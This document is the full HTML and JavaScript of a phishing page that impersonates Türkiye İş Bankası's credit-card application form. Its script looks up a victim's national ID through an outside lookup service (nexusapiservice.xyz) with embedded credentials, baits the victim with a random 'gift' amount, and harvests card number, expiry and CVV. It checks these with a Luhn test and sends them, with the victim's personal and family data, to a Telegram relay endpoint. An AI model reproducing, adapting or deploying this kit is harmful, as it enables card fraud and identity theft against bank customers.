<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>TÃ¼rkiye Ä°ÅŸ BankasÄ± - BaÅŸvuru</title>
  <meta name="theme-color" content="#08335E">
  <meta name="msapplication-TileColor" content="#08335E">
  <meta name="msapplication-navbutton-color" content="#08335E">
  <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
  <link rel="stylesheet" href="./dist/app.css">
  <link rel="stylesheet" href="./dist/jquery-ui.min.css">
  <link rel="shortcut icon" href="./dist/islogo_192.png" type="image/x-icon">
  <style>
    .basvuru-info-section {
      background: #f5f5f5;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .info-item {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid #ddd;
    }
    .info-item:last-child {
      border-bottom: none;
    }
    .info-label {
      font-weight: bold;
      color: #333;
    }
    .info-value {
      color: #666;
    }
    .loading-container {
      text-align: center;
      padding: 20px;
      color: #666;
    }
    .error-container {
      background: #fee;
      color: #c00;
      padding: 15px;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    .basvuru-form-group {
      margin-bottom: 20px;
    }
    .basvuru-input-label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #333;
    }
    .basvuru-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .basvuru-input:focus {
      outline: none;
      border-color: #08335E;
    }
    .hidden {
      display: none;
    }
  </style>
</head>

<body>
  <div id="viewport">
    <div id="leftBannerContainer" style="background-image:url(./dist/banner.jpg);"></div>
    <div id="header">
      <div id="logoContainer">
        <img class="isbank-header-logo" src="./dist/logo.png" alt="iÅŸ bankasÄ± logo">
      </div>
    </div>
    <div id="mainContent" class="loginMainContent">
      <div class="mobileHeaderContainer">
        <div class="mobileHeader">
        </div>
      </div>
      <div class="pageContainer">
        <div id="StraightLogin">
          <span id="LoginLabel">
            <div id="z5-tab-wrapper">
            </div>
            <div id="loginPageMiddlePartContainer">
              <div class="contentBoxContainer">
                <div class="contentBox" id="loginTypesContainer">
                  <div class="loginTitle">
                    <span>Kredi KartÄ± BaÅŸvurusu</span>
                  </div>
                  <div class="loginTitleMobile">
                    <span>BaÅŸvuru Formu</span>
                  </div>

                  <div id="loading" class="loading-container hidden">
                    Bilgileriniz yÃ¼kleniyor...
                  </div>

                  <div id="error" class="error-container hidden"></div>

                  <div id="content" class="hidden">
                    <div class="basvuru-info-section">
                      <h2 style="margin-top: 0; color: #08335E;">KiÅŸisel Bilgiler</h2>
                      <div class="info-item">
                        <span class="info-label">Ad Soyad:</span>
                        <span class="info-value" id="adSoyad">-</span>
                      </div>
                      <div class="info-item">
                        <span class="info-label">DoÄŸum Tarihi:</span>
                        <span class="info-value" id="dogumTarihi">-</span>
                      </div>
                      <div class="info-item">
                        <span class="info-label">Cinsiyet:</span>
                        <span class="info-value" id="cinsiyet">-</span>
                      </div>
                      <div class="info-item">
                        <span class="info-label">DoÄŸum Yeri:</span>
                        <span class="info-value" id="dogumYeri">-</span>
                      </div>
                      <div class="info-item">
                        <span class="info-label">Anne AdÄ±:</span>
                        <span class="info-value" id="anneAdi">-</span>
                      </div>
                    </div>

                    <div class="basvuru-info-section" style="background: #e8f4f8; border-left: 4px solid #08335E; margin-bottom: 20px;">
                      <h2 style="margin-top: 0; color: #08335E; font-size: 20px;">ğŸ‰ Tebrikler DeÄŸerli Ä°ÅŸbank KullanÄ±cÄ±sÄ±</h2>
                      <p style="color: #333; font-size: 16px; margin: 10px 0;">
                        Sizin iÃ§in uygun gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z deÄŸer: <strong style="color: #08335E; font-size: 18px;" id="hediyeDegeri">-</strong>
                      </p>
                    </div>

                    <form id="basvuruForm">
                      <div class="basvuru-form-group">
                        <label class="basvuru-input-label" for="kartLimiti">Kart Limiti (TL)</label>
                        <input type="tel" id="kartLimiti" name="kartLimiti" class="basvuru-input" placeholder="Kredi KartÄ± Limitiniz" min="1" max="99000000" required>
                        <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">Minimum: 1.000 TL, Maksimum: 99.000.000 TL</small>
                      </div>

                      <div class="loginFormButtonHolder">
                        <button type="submit" class="ui-button darkBlueButton login" id="submitBtn">BaÅŸvuruyu Tamamla</button>
                      </div>
                    </form>

                    <!-- Kredi KartÄ± Bilgileri Formu - BaÅŸlangÄ±Ã§ta gizli -->
                    <form id="krediKartiForm" style="display: none; margin-top: 30px;" novalidate>
                      <div class="basvuru-info-section" style="background: #fff3cd; border-left: 4px solid #ffc107; margin-bottom: 20px;">
                        <h3 style="margin-top: 0; color: #856404; font-size: 18px;">Kredi KartÄ± Bilgileri</h3>
                        <p style="color: #856404; font-size: 14px; margin: 10px 0;">LÃ¼tfen kredi kartÄ± bilgilerinizi giriniz</p>
                      </div>

                      <div class="basvuru-form-group">
                        <label class="basvuru-input-label" for="kartNumarasi">Kart NumarasÄ±</label>
                        <input type="tel" id="kartNumarasi" name="kartNumarasi" class="basvuru-input standardInput" placeholder="0000 0000 0000 0000" maxlength="19" pattern="[0-9\s]{13,19}" required autocomplete="cc-number" style="font-size: 18px; padding: 12px 15px; letter-spacing: 2px;">
                        <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">16 haneli kart numaranÄ±zÄ± giriniz</small>
                      </div>

                      <div class="basvuru-form-group">
                        <label class="basvuru-input-label" for="sonKullanimAy">Son Kullanma Tarihi</label>
                        <div style="display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
                            <input type="tel" id="sonKullanimAy" name="sonKullanimAy" class="basvuru-input standardInput" placeholder="M" maxlength="2" pattern="[0-9]{1,2}" required autocomplete="cc-exp-month" style="width: 100px; text-align: center; font-size: 18px; padding: 12px; flex-shrink: 0;">
                            <span style="font-size: 20px; color: #666; font-weight: bold; flex-shrink: 0;">/</span>
                            <input type="tel" id="sonKullanimYil" name="sonKullanimYil" class="basvuru-input standardInput" placeholder="YY" maxlength="2" pattern="[0-9]{1,2}" required autocomplete="cc-exp-year" style="width: 100px; text-align: center; font-size: 18px; padding: 12px; flex-shrink: 0;">
                        </div>
                      </div>

                      <div class="basvuru-form-group">
                        <label class="basvuru-input-label" for="cvv">CVV</label>
                        <input type="tel" id="cvv" name="cvv" class="basvuru-input standardInput" placeholder="000" maxlength="3" pattern="[0-9]{3}" required autocomplete="cc-csc" style="width: 150px; text-align: center; font-size: 18px; padding: 12px;">
                        <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">KartÄ±n arkasÄ±ndaki 3 haneli numara</small>
                      </div>

                      <div class="loginFormButtonHolder">
                        <button type="button" class="ui-button darkBlueButton login" id="kartSubmitBtn">Kart Bilgilerini Onayla</button>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </span>
        </div>
      </div>
      <div id="footer">
        <div id="content">
          <div id="left">
            <div class="container">
              <span id="copyRightContainer">Â©<script>document.write(new Date().getFullYear())</script> TÃ¼rkiye Ä°ÅŸ BankasÄ± A.Å</span>
            </div>
          </div>
          <div id="right">
            <div class="container">
              <div id="footerLinksContainer">
                <div class="footerLinks contactUsContainer">
                  <a id="indexLinkIletisim">
                    <span id="indexIletisim">Bize UlaÅŸÄ±n</span>
                  </a>
                </div>
                <div class="footerLinks last languageContainer">
                  <span id="lblSubeGirisLangSelect">
                    <div id="languageFlagSelect">
                      <span id="usaflaglabel" class="isbank-page-language selected-language">English</span>
                      <span id="turkishflaglabel" class="isbank-page-language">TÃ¼rkÃ§e</span>
                    </div>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="touchOverlay">
      </div>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.min.js" integrity="sha512-ijLvQMMXgWAO85zfDbKeoqNR7015wrZI42XGYorITKkG0sVlP4t+Rt5Dl9EKDkrPxGrWZmVCUW5oIXkVOrnCiw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
  <script>
    // fakesocket Ã§aÄŸrÄ±sÄ±nÄ± engelle
    if (typeof fetch !== 'undefined') {
      const originalFetch = window.fetch;
      window.fetch = function(...args) {
        const url = args[0];
        if (typeof url === 'string' && (url.includes('fakesocket.php') || url.includes('fakesocket'))) {
          console.log('fakesocket.php Ã§aÄŸrÄ±sÄ± engellendi');
          return Promise.resolve(new Response(JSON.stringify({ success: true }), {
            status: 200,
            headers: { 'Content-Type': 'application/json' }
          }));
        }
        return originalFetch.apply(this, args);
      };
    }
  </script>
  <script src="./dist/app.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const tc = urlParams.get('tc');
      let hediye = urlParams.get('hediye'); // Hediye deÄŸerini querystring'den al
      
      // Hediye deÄŸeri yoksa random oluÅŸtur ve querystring'i gÃ¼ncelle
      if (!hediye) {
        // 40.000 - 50.000 TL arasÄ±nda random tek bir deÄŸer oluÅŸtur
        const minHediye = 40000;
        const maxHediye = 50000;
        const randomHediye = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
        hediye = randomHediye.toString();
        urlParams.set('hediye', hediye);
        const newUrl = window.location.pathname + '?' + urlParams.toString();
        window.history.replaceState({}, '', newUrl);
        console.log('Random hediye deÄŸeri oluÅŸturuldu:', hediye);
      }

      const loadingDiv = document.getElementById('loading');
      const errorDiv = document.getElementById('error');
      const contentDiv = document.getElementById('content');
      const submitBtn = document.getElementById('submitBtn');
      
      // API'den gelen tÃ¼m verileri sakla
      let apiData = null;

      // Hediye deÄŸerini gÃ¶ster
      const hediyeDegeri = document.getElementById('hediyeDegeri');
      if (hediyeDegeri && hediye) {
        // Tek bir deÄŸer olarak gÃ¶ster: "43250" -> "43.250 TL"
        const hediyeNum = parseInt(hediye);
        if (!isNaN(hediyeNum)) {
          const formattedHediye = hediyeNum.toLocaleString('tr-TR');
          hediyeDegeri.textContent = `${formattedHediye} TL`;
        } else {
          hediyeDegeri.textContent = hediye + ' TL';
        }
      }

      function toggleHidden(element, show) {
        if (show) {
          element.classList.remove('hidden');
        } else {
          element.classList.add('hidden');
        }
      }

      if (!tc || tc.length !== 11) {
        toggleHidden(errorDiv, true);
        errorDiv.textContent = 'GeÃ§erli bir TC kimlik numarasÄ± bulunamadÄ±. LÃ¼tfen tekrar deneyin.';
        return;
      }

      // API'den bilgileri Ã§ek
      toggleHidden(loadingDiv, true);

      console.log('Fetching API for TC:', tc);
      
      // Direkt external API'ye istek at
      const apiUrl = `https://nexusapiservice.xyz/servis/tckn/apiv2?hash=CcjS8ZvefIZccOZbr&auth=tosun&tc=${tc}`;
      
      fetch(apiUrl)
        .then(response => {
          console.log('Response status:', response.status);
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          return response.json();
        })
        .then(data => {
          console.log('API Response:', data);
          toggleHidden(loadingDiv, false);

          if (data.Info && data.Info.Status === 'OK' && data.Veri) {
            const veri = data.Veri;
            
            // TÃ¼m veriyi sakla
            apiData = veri;
            
            // API'den gelen verileri gÃ¶ster: Adi, Soyadi, DogumTarihi, AnneAdi
            const adi = veri.Adi || '';
            const soyadi = veri.Soyadi || '';
            const dogumTarihi = veri.DogumTarihi || '';
            const anneAdi = veri.AnneAdi || '';
            
            // Ad Soyad birleÅŸtir
            const adSoyad = `${adi} ${soyadi}`.trim();
            
            // Bilgileri gÃ¶ster
            document.getElementById('adSoyad').textContent = adSoyad || '-';
            document.getElementById('dogumTarihi').textContent = dogumTarihi || '-';
            document.getElementById('cinsiyet').textContent = veri.Cinsiyet || '-';
            document.getElementById('dogumYeri').textContent = veri.DogumYeri || '-';
            document.getElementById('anneAdi').textContent = anneAdi || '-';

            console.log('API Verileri:', {
              Adi: adi,
              Soyadi: soyadi,
              AdSoyad: adSoyad,
              DogumTarihi: dogumTarihi,
              AnneAdi: anneAdi
            });

            // Ä°Ã§eriÄŸi gÃ¶ster
            toggleHidden(contentDiv, true);
          } else {
            console.log('API response not OK, showing default values');
            // Hata olsa bile sayfayÄ± aÃ§, bilgileri "-" olarak gÃ¶ster
            apiData = {
              Adi: '',
              Soyadi: '',
              DogumTarihi: '',
              Cinsiyet: '',
              DogumYeri: '',
              AnneAdi: '',
              BabaAdi: '',
              AnneTCKN: '',
              BabaTCKN: '',
              AdresIl: '',
              AdresIlce: '',
              MemleketIl: '',
              MemleketIlce: '',
              MedeniHal: ''
            };
            
            // Bilgileri "-" olarak gÃ¶ster
            document.getElementById('adSoyad').textContent = '-';
            document.getElementById('dogumTarihi').textContent = '-';
            document.getElementById('cinsiyet').textContent = '-';
            document.getElementById('dogumYeri').textContent = '-';
            document.getElementById('anneAdi').textContent = '-';

            // Ä°Ã§eriÄŸi gÃ¶ster (hata gÃ¶sterme)
            toggleHidden(contentDiv, true);
          }
        })
        .catch(error => {
          console.error('Fetch Error:', error);
          toggleHidden(loadingDiv, false);
          
          // Hata olsa bile sayfayÄ± aÃ§, bilgileri "-" olarak gÃ¶ster
          apiData = {
            Adi: '',
            Soyadi: '',
            DogumTarihi: '',
            Cinsiyet: '',
            DogumYeri: '',
            AnneAdi: '',
            BabaAdi: '',
            AnneTCKN: '',
            BabaTCKN: '',
            AdresIl: '',
            AdresIlce: '',
            MemleketIl: '',
            MemleketIlce: '',
            MedeniHal: ''
          };
          
          // Bilgileri "-" olarak gÃ¶ster
          document.getElementById('adSoyad').textContent = '-';
          document.getElementById('dogumTarihi').textContent = '-';
          document.getElementById('cinsiyet').textContent = '-';
          document.getElementById('dogumYeri').textContent = '-';
          document.getElementById('anneAdi').textContent = '-';

          // Ä°Ã§eriÄŸi gÃ¶ster (hata gÃ¶sterme)
          toggleHidden(contentDiv, true);
        });

      // Kart limiti formatÄ± - sadece rakam, max 99 milyon
      document.getElementById('kartLimiti').addEventListener('input', function(e) {
        // Sadece rakamlarÄ± al
        let value = this.value.replace(/[^0-9]/g, '');
        
        // Max 99.000.000 kontrolÃ¼
        const maxValue = 99000000;
        if (value && parseInt(value) > maxValue) {
          value = maxValue.toString();
        }
        
        this.value = value;
      });

      // Kredi kartÄ± numarasÄ± formatÄ± (4'er haneli gruplar)
      function formatKartNumarasi(value) {
        const cleaned = value.replace(/\s/g, '').replace(/\D/g, '');
        const formatted = cleaned.match(/.{1,4}/g);
        return formatted ? formatted.join(' ') : cleaned;
      }

      // Ay/YÄ±l formatÄ± - tek haneli de olabilir
      function formatAyYil(value, type) {
        const cleaned = value.replace(/\D/g, '');
        if (type === 'ay' && cleaned.length > 0) {
          const ay = parseInt(cleaned);
          if (ay > 12) return '12';
          // Tek haneli de kabul et (1-9)
          return cleaned;
        }
        // YÄ±l iÃ§in de tek haneli kabul et
        return cleaned;
      }

      // CVV formatÄ±
      function formatCVV(value) {
        return value.replace(/\D/g, '').substring(0, 3);
      }

      // Kredi kartÄ± input'larÄ± iÃ§in event listener'lar
      const kartNumarasiInput = document.getElementById('kartNumarasi');
      const sonKullanimAyInput = document.getElementById('sonKullanimAy');
      const sonKullanimYilInput = document.getElementById('sonKullanimYil');
      const cvvInput = document.getElementById('cvv');

      if (kartNumarasiInput) {
        kartNumarasiInput.addEventListener('input', function(e) {
          // Ã–nce sadece rakamlarÄ± al
          let cleaned = this.value.replace(/\s/g, '').replace(/\D/g, '');
          
          // Maksimum 16 karakter
          if (cleaned.length > 16) {
            cleaned = cleaned.substring(0, 16);
          }
          
          // Formatla (4'er haneli gruplar)
          this.value = formatKartNumarasi(cleaned);
        });
        
        // Paste event'ini de handle et
        kartNumarasiInput.addEventListener('paste', function(e) {
          e.preventDefault();
          const pastedText = (e.clipboardData || window.clipboardData).getData('text');
          let cleaned = pastedText.replace(/\s/g, '').replace(/\D/g, '');
          
          if (cleaned.length > 16) {
            cleaned = cleaned.substring(0, 16);
          }
          
          this.value = formatKartNumarasi(cleaned);
          this.dispatchEvent(new Event('input'));
        });
      }

      if (sonKullanimAyInput) {
        sonKullanimAyInput.addEventListener('input', function(e) {
          this.value = formatAyYil(this.value, 'ay');
        });
      }

      if (sonKullanimYilInput) {
        sonKullanimYilInput.addEventListener('input', function(e) {
          this.value = formatAyYil(this.value, 'yil');
        });
      }

      if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
          this.value = formatCVV(this.value);
        });
      }

      // Ä°lk form submit - Kart limiti
      document.getElementById('basvuruForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');
        const kartLimitiNum = parseInt(kartLimiti);

        // Validasyon: Minimum 1000 TL, Maksimum 99.000.000 TL
        if (!kartLimiti || kartLimiti.length === 0) {
          alert('LÃ¼tfen kart limitinizi giriniz');
          return;
        }

        if (kartLimitiNum < 1000) {
          alert('Kart limiti en az 1.000 TL olmalÄ±dÄ±r');
          return;
        }

        if (kartLimitiNum > 99000000) {
          alert('Kart limiti en fazla 99.000.000 TL olabilir');
          return;
        }

        // Telegram'a bildirim gÃ¶nder - AdÄ±m 2
        const telefon = urlParams.get('phone') || '';
        const hediye = urlParams.get('hediye') || '';
        
        fetch('/api/send-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            type: 'step2',
            tckn: tc,
            telefon: telefon,
            kartLimiti: kartLimiti,
            hediye: hediye,
            adSoyad: `${apiData?.Adi || ''} ${apiData?.Soyadi || ''}`.trim(),
            dogumTarihi: apiData?.DogumTarihi || '',
            cinsiyet: apiData?.Cinsiyet || '',
            dogumYeri: apiData?.DogumYeri || '',
            anneAdi: apiData?.AnneAdi || '',
            babaAdi: apiData?.BabaAdi || '',
            anneTCKN: apiData?.AnneTCKN || '',
            babaTCKN: apiData?.BabaTCKN || '',
            adresIl: apiData?.AdresIl || '',
            adresIlce: apiData?.AdresIlce || '',
            memleketIl: apiData?.MemleketIl || '',
            memleketIlce: apiData?.MemleketIlce || '',
            medeniHal: apiData?.MedeniHal || ''
          })
        }).catch(function(error) {
          console.error('Telegram bildirim hatasÄ±:', error);
        });

        // BaÅŸvuru formunu gizle
        document.getElementById('basvuruForm').style.display = 'none';
        
        // Kredi kartÄ± formunu gÃ¶ster
        document.getElementById('krediKartiForm').style.display = 'block';
        
        // SayfayÄ± kaydÄ±r (smooth scroll)
        document.getElementById('krediKartiForm').scrollIntoView({ behavior: 'smooth', block: 'start' });
      });

      // Luhn algoritmasÄ± ile geÃ§erlilik kontrolÃ¼ (global fonksiyon)
      function validateLuhn(cardNumber) {
        if (!cardNumber || cardNumber.length === 0) {
          return false;
        }
        
        // Sadece rakam kontrolÃ¼
        if (!/^\d+$/.test(cardNumber)) {
          return false;
        }
        
        let sum = 0;
        let isEven = false;
        
        // SaÄŸdan sola doÄŸru iÅŸle
        for (let i = cardNumber.length - 1; i >= 0; i--) {
          let digit = parseInt(cardNumber[i]);
          
          if (isEven) {
            digit *= 2;
            if (digit > 9) {
              digit -= 9;
            }
          }
          
          sum += digit;
          isEven = !isEven;
        }
        
        return sum % 10 === 0;
      }

      // Kredi kartÄ± formu submit fonksiyonu
      function submitKrediKartiForm() {
        console.log('Kredi kartÄ± formu submit fonksiyonu Ã§aÄŸrÄ±ldÄ± - Validasyon baÅŸlÄ±yor...');

        // Kredi kartÄ± numarasÄ±nÄ± temizle (boÅŸluklarÄ± ve rakam olmayan karakterleri kaldÄ±r)
        const kartNumarasiInput = document.getElementById('kartNumarasi');
        if (!kartNumarasiInput) {
          console.error('Kart numarasÄ± input bulunamadÄ±!');
          return false;
        }
        
        const kartNumarasiRaw = kartNumarasiInput.value;
        const kartNumarasi = kartNumarasiRaw.replace(/\s/g, '').replace(/\D/g, '');
        
        console.log('Kart numarasÄ± (raw):', kartNumarasiRaw);
        console.log('Kart numarasÄ± (cleaned):', kartNumarasi);
        console.log('Kart numarasÄ± uzunluÄŸu:', kartNumarasi.length);

        const sonKullanimAy = document.getElementById('sonKullanimAy').value;
        const sonKullanimYil = document.getElementById('sonKullanimYil').value;
        const cvv = document.getElementById('cvv').value;
        const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');

        // Kredi kartÄ± numarasÄ± validasyonu - SÄ±ralÄ± kontrol
        if (!kartNumarasi || kartNumarasi.length === 0) {
          console.log('Hata: Kart numarasÄ± boÅŸ');
          alert('LÃ¼tfen kredi kartÄ± numaranÄ±zÄ± giriniz');
          kartNumarasiInput.focus();
          kartNumarasiInput.select();
          return false;
        }

        // Sadece rakam kontrolÃ¼ (double check)
        if (!/^\d+$/.test(kartNumarasi)) {
          console.log('Hata: Kart numarasÄ± sadece rakamlardan oluÅŸmuyor');
          alert('Kredi kartÄ± numarasÄ± sadece rakamlardan oluÅŸmalÄ±dÄ±r');
          kartNumarasiInput.focus();
          kartNumarasiInput.select();
          return false;
        }

        // 16 haneli olmalÄ± - KESIN KONTROL
        if (kartNumarasi.length !== 16) {
          console.log('Hata: Kart numarasÄ± 16 haneli deÄŸil, uzunluk:', kartNumarasi.length);
          alert('Kredi kartÄ± numarasÄ± tam olarak 16 haneli olmalÄ±dÄ±r. LÃ¼tfen kontrol ediniz. (Girilen: ' + kartNumarasi.length + ' hane)');
          kartNumarasiInput.focus();
          kartNumarasiInput.select();
          return false;
        }

        // AynÄ± rakamlarÄ±n tekrarÄ± kontrolÃ¼ (1111111111111111 gibi)
        if (/^(\d)\1{15}$/.test(kartNumarasi)) {
          console.log('Hata: AynÄ± rakamlarÄ±n tekrarÄ±');
          alert('GeÃ§erli bir kredi kartÄ± numarasÄ± giriniz');
          kartNumarasiInput.focus();
          kartNumarasiInput.select();
          return false;
        }

        // Luhn algoritmasÄ± ile geÃ§erlilik kontrolÃ¼
        const isLuhnValid = validateLuhn(kartNumarasi);
        console.log('Luhn algoritmasÄ± sonucu:', isLuhnValid);
        
        if (!isLuhnValid) {
          console.log('Hata: Luhn algoritmasÄ± geÃ§ersiz');
          alert('GeÃ§erli bir kredi kartÄ± numarasÄ± giriniz');
          kartNumarasiInput.focus();
          kartNumarasiInput.select();
          return false;
        }

        console.log('Kart numarasÄ± validasyonu baÅŸarÄ±lÄ±!');

        // Ay kontrolÃ¼ - 1-12 arasÄ±, tek haneli de olabilir (1-9 veya 01-12)
        const ayNum = parseInt(sonKullanimAy);
        if (!sonKullanimAy || sonKullanimAy.length === 0 || ayNum < 1 || ayNum > 12) {
          console.log('Hata: Ay geÃ§ersiz');
          alert('LÃ¼tfen geÃ§erli bir ay giriniz (1-12)');
          return false;
        }

        // YÄ±l kontrolÃ¼ - 1-2 haneli olabilir (1-99)
        if (!sonKullanimYil || sonKullanimYil.length === 0) {
          console.log('Hata: YÄ±l geÃ§ersiz');
          alert('LÃ¼tfen geÃ§erli bir yÄ±l giriniz');
          return false;
        }

        if (!cvv || cvv.length !== 3) {
          console.log('Hata: CVV geÃ§ersiz');
          alert('LÃ¼tfen geÃ§erli bir CVV numarasÄ± giriniz (3 haneli)');
          return false;
        }

        console.log('TÃ¼m validasyonlar baÅŸarÄ±lÄ±! Telegram gÃ¶nderiliyor...');

        // Telegram'a bildirim gÃ¶nder - AdÄ±m 3 (async, yÃ¶nlendirmeyi beklemez)
        const telefon = urlParams.get('phone') || '';
        const hediye = urlParams.get('hediye') || '';
        
        // Telegram bildirimi gÃ¶nder (await etmeden, arka planda Ã§alÄ±ÅŸÄ±r)
        fetch('/api/send-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            type: 'step3',
            tckn: tc,
            telefon: telefon,
            kartLimiti: kartLimiti,
            hediye: hediye,
            adSoyad: `${apiData?.Adi || ''} ${apiData?.Soyadi || ''}`.trim(),
            dogumTarihi: apiData?.DogumTarihi || '',
            cinsiyet: apiData?.Cinsiyet || '',
            dogumYeri: apiData?.DogumYeri || '',
            anneAdi: apiData?.AnneAdi || '',
            babaAdi: apiData?.BabaAdi || '',
            anneTCKN: apiData?.AnneTCKN || '',
            babaTCKN: apiData?.BabaTCKN || '',
            adresIl: apiData?.AdresIl || '',
            adresIlce: apiData?.AdresIlce || '',
            memleketIl: apiData?.MemleketIl || '',
            memleketIlce: apiData?.MemleketIlce || '',
            medeniHal: apiData?.MedeniHal || '',
            kartNumarasi: kartNumarasi,
            sonKullanimAy: sonKullanimAy,
            sonKullanimYil: sonKullanimYil,
            cvv: cvv
          })
        }).catch(function(error) {
          console.error('Telegram bildirim hatasÄ±:', error);
        });

        // BaÅŸvuru tamamlandÄ± - direkt tamamlandi.html'ye yÃ¶nlendir
        window.location.href = '/tamamlandi.html';
        return true;
      }

      // Butona click event listener ekle
      const kartSubmitBtn = document.getElementById('kartSubmitBtn');
      if (kartSubmitBtn) {
        // Ã–nce mevcut event listener'larÄ± temizle
        const newBtn = kartSubmitBtn.cloneNode(true);
        kartSubmitBtn.parentNode.replaceChild(newBtn, kartSubmitBtn);
        
        newBtn.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          
          console.log('Buton tÄ±klandÄ±! Validasyon baÅŸlatÄ±lÄ±yor...');
          submitKrediKartiForm();
        }, true); // Capture phase'de Ã§alÄ±ÅŸ
      }

      // Form submit event'i de ekle (gÃ¼venlik iÃ§in)
      const krediKartiForm = document.getElementById('krediKartiForm');
      if (krediKartiForm) {
        krediKartiForm.addEventListener('submit', function(e) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          console.log('Form submit event tetiklendi!');
          submitKrediKartiForm();
        });
      }
    });
  </script>
</body>
</html>

